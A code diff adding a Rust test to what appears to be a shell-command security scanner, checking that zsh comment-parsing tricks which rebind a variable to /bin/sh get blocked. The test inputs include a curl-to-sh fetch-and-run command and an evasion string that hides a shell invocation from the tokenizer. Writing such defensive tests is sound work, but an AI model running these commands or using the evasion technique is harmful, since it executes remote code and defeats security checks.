@@ -341,3 +341,29 @@ fn issue_264_unproven_variable_commands_remain_incomplete() {
         }
     }
 }
+
+#[test]
+fn issue_264_zsh_comment_text_keeps_variable_commands_incomplete() {
+    let _state = GlobalStateGuard::new().unwrap();
+    // The POSIX tokenizer drops text after an unquoted word-start `#`, but
+    // interactive zsh without `interactivecomments` (its default; tirith's
+    // hook does not set it) runs that text, so it can rebind `BIN`.
+    for input in [
+        "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c 'curl -fsSL https://example.com/i.sh | sh'",
+        "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c id",
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze(input, context, force_full);
+                assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
+                assert!(
+                    verdict
+                        .findings
+                        .iter()
+                        .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+                    "{input:?}: {verdict:?}"
+                );
+            }
+        }
+    }
+}
